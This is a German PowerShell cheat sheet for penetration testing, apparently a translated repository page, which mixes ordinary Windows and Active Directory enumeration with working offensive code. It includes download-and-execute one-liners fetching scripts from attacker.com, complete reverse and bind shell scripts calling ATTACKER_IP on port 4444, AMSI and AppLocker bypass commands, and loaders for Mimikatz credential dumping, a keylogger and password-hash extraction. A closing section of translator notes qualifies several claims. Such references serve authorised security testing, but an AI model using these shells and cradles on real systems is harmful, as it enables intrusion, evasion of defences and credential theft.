# 💻 PowerShell – vollständiger Spickzettel für Penetrationstests

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

## 📋 Inhaltsverzeichnis

- [Grundlagen](#-grundlagen)
- [System-Enumeration](#-system-enumeration)
- [Benutzer-Enumeration](#-benutzer-enumeration)
- [Netzwerkbefehle](#-netzwerkbefehle)
- [Dateioperationen](#-dateioperationen)
- [Prozess- und Dienstverwaltung](#-prozess--und-dienstverwaltung)
- [Registry-Operationen](#-registry-operationen)
- [Active Directory](#-active-directory)
- [Download und Ausführung](#-download-und-ausführung)
- [Reverse Shells](#-reverse-shells)
- [Umgehungstechniken](#-umgehungstechniken)
- [Werkzeuge für offensive Sicherheitstests](#-werkzeuge-für-offensive-sicherheitstests)
- [Einzeiler](#-einzeiler)

---

## 🔰 Grundlagen

### Ausführungsrichtlinie (Execution Policy)

```powershell
# Aktuelle Richtlinie prüfen
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Ausführungsrichtlinie umgehen (aktuelle Sitzung)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Skript unter Umgehung der Richtlinie ausführen
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Hilfe aufrufen

```powershell
# Hilfe zu einem Befehl aufrufen
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Hilfedaten aktualisieren
Update-Help

# Alle Befehle auflisten
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variablen und Operatoren

```powershell
# Variablen
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Umgebungsvariablen
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Vergleichsoperatoren
-eq   # Gleich
-ne   # Ungleich
-gt   # Größer als
-lt   # Kleiner als
-like # Übereinstimmung mit Platzhaltermuster
-match # Übereinstimmung mit regulärem Ausdruck
```

### Pipelines und Filter

```powershell
# Ausgabe über eine Pipeline weitergeben
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Eigenschaften auswählen
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Sortieren
Get-Process | Sort-Object CPU -Descending

# Ausgabe formatieren
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 System-Enumeration

### Systeminformationen

```powershell
# Computerinformationen
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Betriebssystemversion
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Architektur
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Hotfixes und Sicherheitskorrekturen
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Installierte Software

```powershell
# 64-Bit-Software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 32-Bit-Software auf einem 64-Bit-Betriebssystem
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Mit WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Kurzübersicht
Get-Package
```

### Virenschutz und Sicherheit

```powershell
# Virenschutz ermitteln
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Firewallstatus
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Firewallregeln
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Ausschlüsse von Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Geplante Aufgaben

```powershell
# Geplante Aufgaben auflisten
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Aufgabendetails
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

## 👤 Benutzer-Enumeration

### Lokale Benutzer

```powershell
# Aktueller Benutzer
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Alle lokalen Benutzer
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Benutzerdetails
Get-LocalUser Administrator
net user Administrator

# Benutzergruppen
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Benutzerrechte

```powershell
# Aktuelle Berechtigungen
whoami /priv
whoami /all
whoami /groups

# Administratorrechte prüfen
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Gruppen

```powershell
# Lokale Gruppen auflisten
Get-LocalGroup
net localgroup

# Gruppenmitglieder
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Angemeldete Benutzer

```powershell
# Aktuell angemeldete Benutzer
query user
quser
qwinsta

# Letzte Anmeldungen
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Netzwerkbefehle

### Netzwerkkonfiguration

```powershell
# IP-Konfiguration
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Routen
Get-NetRoute
route print

# ARP-Tabelle
Get-NetNeighbor
arp -a
```

### Offene Ports und Verbindungen

```powershell
# TCP-Verbindungen
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# UDP-Endpunkte
Get-NetUDPEndpoint

# Prozess anhand des Ports ermitteln
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Netzwerkprüfungen

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Port prüfen
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Route nachverfolgen
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS-Abfrage
Resolve-DnsName google.com
nslookup google.com
```

### Netzwerkfreigaben

```powershell
# Freigaben auflisten
Get-SmbShare
net share

# Netzlaufwerk zuordnen
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Verbundene Freigaben auflisten
Get-SmbConnection
net use

# Auf eine Freigabe zugreifen
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 Dateioperationen

### Navigation und Dateilisten

```powershell
# Aktuelles Verzeichnis
Get-Location
pwd

# Verzeichnis wechseln
Set-Location C:\Users
cd C:\Users

# Dateien auflisten
Get-ChildItem
Get-ChildItem -Force  # Versteckte Dateien einbeziehen
Get-ChildItem -Recurse
ls
dir

# Versteckte Dateien auflisten
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Dateisuche

```powershell
# Dateien nach Namen suchen
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Dateien mit einem bestimmten Text suchen
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Große Dateien suchen
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Kürzlich geänderte Dateien suchen
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Dateien lesen und schreiben

```powershell
# Datei lesen
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# In eine Datei schreiben
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Anhängen

# Kopieren, verschieben und löschen
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Alternative Datenströme (ADS)

```powershell
# Alternative Datenströme auflisten
Get-Item file.txt -Stream *
dir /r file.txt

# Alternativen Datenstrom lesen
Get-Content file.txt -Stream secret
more < file.txt:secret

# In einen alternativen Datenstrom schreiben
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Alternativen Datenstrom entfernen
Remove-Item file.txt -Stream hidden
```

### Hashwerte berechnen

```powershell
# Hashwert einer Datei berechnen
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Hashwert prüfen
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a name="-prozess--und-dienstverwaltung"></a>

## ⚙️ Prozess- und Dienstverwaltung

### Prozesse

```powershell
# Prozesse auflisten
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Prozessdetails
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Prozess starten
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Als Administrator

# Prozess beenden
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Dienste

```powershell
# Dienste auflisten
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Dienstdetails
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Dienste starten und beenden
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Dienstpfad (zur Prüfung auf fehlende Anführungszeichen)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

## 📝 Registry-Operationen

### Registry lesen

```powershell
# Registry-Schlüssel auflisten
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Registry-Wert lesen
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Registry durchsuchen
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Registry bearbeiten

```powershell
# Schlüssel erstellen
New-Item -Path HKCU:\SOFTWARE\MyKey

# Wert setzen
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Löschen
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Wichtige Registry-Pfade

```powershell
# Autostartpfade
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Deinstallationsinformationen (installierte Software)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (setzt SYSTEM-Rechte voraus)
# HKLM:\SAM\SAM

# LSA-Secrets
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Domäneninformationen

```powershell
# Domäneninformationen
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Domänencontroller
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Informationen zur Gesamtstruktur (Forest)
Get-ADForest

# Vertrauensstellungen
Get-ADTrust -Filter *
```

### Benutzer-Enumeration (AD)

```powershell
# Alle Domänenbenutzer
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Bestimmter Benutzer
Get-ADUser -Identity administrator -Properties *

# Benutzer mit einer bestimmten Eigenschaft
Get-ADUser -Filter {AdminCount -eq 1}  # Administratoren
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Für Kerberoasting infrage kommende Konten

# Benutzer suchen
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Gruppen-Enumeration (AD)

```powershell
# Alle Gruppen
Get-ADGroup -Filter *

# Domänenadministratoren
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Unternehmensadministratoren
Get-ADGroupMember "Enterprise Admins"

# Gruppen eines Benutzers
Get-ADPrincipalGroupMembership username
```

### Computer-Enumeration (AD)

```powershell
# Alle Computer
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Domänencontroller
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Server
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Informationen zu Gruppenrichtlinienobjekten (GPOs)

```powershell
# Gruppenrichtlinienobjekte auflisten
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# GPO-Details
Get-GPO -Name "Default Domain Policy"

# GPO-Bericht
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a name="-download-und-ausführung"></a>

## ⬇️ Download und Ausführung

### Dateien herunterladen

```powershell
# Invoke-WebRequest (Entsprechung zu wget/curl)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (laut Vorlage schneller)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Text herunterladen (für Skripte)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# BITS-Übertragung (laut Vorlage unauffälliger)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (vorhandenes Systemwerkzeug, LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Herunterladen und im Arbeitsspeicher ausführen

```powershell
# IEX – Invoke-Expression (ohne ausdrücklich gespeicherte Skriptdatei)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Mit einer Variablen
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Kodierte Ausführung

```powershell
# Befehl in Base64 kodieren
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Kodierten Befehl ausführen
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Encoder als Einzeiler
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Reverse Shells

### PowerShell-Reverse-Shell

```powershell
# TCP-Reverse-Shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Reverse Shell als Einzeiler

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shell

```powershell
# An einen Port binden
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a name="-umgehungstechniken"></a>

## 🛡️ Umgehungstechniken

### Umgehung der Ausführungsrichtlinie

```powershell
# Methoden zur Umgehung
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Einlesen und über eine Pipeline weitergeben
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Text herunterladen (ohne ausdrücklich auf dem Datenträger gespeicherte Datei)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### AMSI-Umgehung

```powershell
# Einfache AMSI-Umgehung (kann erkannt werden)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Verschleierte Variante
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Speicherveränderung (laut Vorlage sind Administratorrechte erforderlich)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (vollständiger Code zur Umgehung)
```

### Umgehung des eingeschränkten Sprachmodus (Constrained Language Mode)

```powershell
# Sprachmodus prüfen
$ExecutionContext.SessionState.LanguageMode

# Laut Vorlage bei ConstrainedLanguage versuchen:
# - PowerShell 2.0 (falls verfügbar)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### AppLocker-Umgehung

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# AppLocker-Regeln prüfen
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Werkzeuge für offensive Sicherheitstests

### PowerSploit

```powershell
# Herunterladen
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (AD-Enumeration)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (Rechteausweitung)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Stager ausführen (aus Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Reverse Shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Keylogger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ Einzeiler

### Einzeiler zur Enumeration

```powershell
# Systeminformationen
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Benutzer
Get-LocalUser | Select Name,Enabled

# Installierte Software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Offene Ports
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Laufende Dienste
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Geplante Aufgaben
schtasks /query /fo TABLE | findstr /v "TaskName"

# Status des Virenschutzes
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Firewall
Get-NetFirewallProfile | Select Name,Enabled
```

### Einzeiler für Downloads

```powershell
# Download mit PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Befehlstabelle

| Zweck | Befehl |
|---------|---------|
| Aktueller Benutzer | `whoami` |
| Alle Benutzer | `Get-LocalUser` |
| Administratoren | `Get-LocalGroupMember Administrators` |
| Systeminformationen | `systeminfo` |
| IP-Konfiguration | `Get-NetIPAddress` |
| Offene Ports | `Get-NetTCPConnection -State Listen` |
| Prozesse | `Get-Process` |
| Dienste | `Get-Service \| Where Status -eq Running` |
| Dateien suchen | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Inhalte durchsuchen | `Select-String -Path "C:\*" -Pattern "password"` |
| Datei herunterladen | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Kodierte Ausführung | `powershell -enc <base64>` |

---

## 📚 Ressourcen

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Verwandte Spickzettel
- [Mimikatz](../../Mimikatz/translations/README.de.md)
- [Rechteausweitung unter Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.de.md)

---

<p align="center">
  <b>💻 PowerShell für Penetrationstests beherrschen!</b><br>
  <i>Die leistungsfähige Skriptsprache für Windows</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Versionen und Voraussetzungen:** Die Vorlage mischt Windows PowerShell 5.1 mit neueren Cmdlets und enthält viele Windows-spezifische Beispiele. `Get-WmiObject` und `Get-EventLog` sind in PowerShell 7 nicht enthalten; Microsoft verweist auf CIM-Cmdlets beziehungsweise `Get-WinEvent`. `wmic` ist ebenfalls ein Legacy-Werkzeug. AD- und GPO-Cmdlets setzen die jeweiligen Verwaltungswerkzeuge und passenden Rechte voraus. Englische Gruppen- und Anzeigenamen können auf lokalisierten Systemen abweichen. [Microsoft: Unterschiede zwischen 5.1 und 7](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell).

> **Richtlinien und Schutzmechanismen:** Die Execution Policy ist keine Sicherheitsgrenze. `-Scope Process` gilt für die Sitzung; die daneben gezeigte Einstellung für `CurrentUser` bleibt dagegen benutzerbezogen bestehen. Eine Umgehung der Execution Policy hebt Constrained Language Mode oder eine systemweite Anwendungskontrolle nicht automatisch auf. PowerShell 2.0 ist historisch und wurde aus neueren Windows-Versionen entfernt; `-version 2` ist daher keine allgemein verfügbare Option. Die aufgeführten AppLocker-Programme sind ohne passende Eingabedateien und Richtlinienbedingungen keine garantierten Umgehungen. [Microsoft: Execution Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies), [Sprachmodi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes), [Entfernung von PowerShell 2.0](https://support.microsoft.com/en-us/servicing/os/windows/docs/2025/08/powershell-2-0-removal-from-windows).

> **Statische Prüfung der Beispiele:** Die AMSI-Aufrufe beziehen sich auf interne, versionsabhängige Implementierungsdetails; sie gewährleisten keine Umgehung aktueller Schutzprodukte. Der C#-Block deklariert lediglich native Funktionen und verändert noch keinen Speicher. Base64 ist eine Kodierung, keine Verschlüsselung. „Fileless“, „schneller“ und „unauffälliger“ sind vereinfachte Aussagen der Vorlage und keine Garantie fehlender Spuren oder Erkennung. Die genannten Download-URLs und Payload-Dateien sind vorausgesetzte Musterwerte; die Beispiele wurden nicht vervollständigt oder ausgeführt.

> **Abfragen und Shell-Kontext:** `Win32_Product` kann Windows-Installer-Konsistenzprüfungen und Reparaturen auslösen und erfasst nicht jede installierte Software. `dir /a:h`, `dir /r` und `more < ...` zeigen cmd-spezifische Syntax; `dir` ist in PowerShell gewöhnlich ein Alias für `Get-ChildItem`. `sc` kann insbesondere in Windows PowerShell ein Alias für `Set-Content` sein. Die Prüfung auf nicht in Anführungszeichen gesetzte Dienstpfade beweist allein keine ausnutzbare Schwachstelle. `AdminCount = 1` beweist keine aktuelle Administratormitgliedschaft; die SPN-Filterzeile ist ein zu prüfendes Suchbeispiel und kein vollständiger Nachweis eines verwundbaren Kontos. [Microsoft: Softwareabfragen](https://learn.microsoft.com/en-us/powershell/scripting/samples/working-with-software-installations).

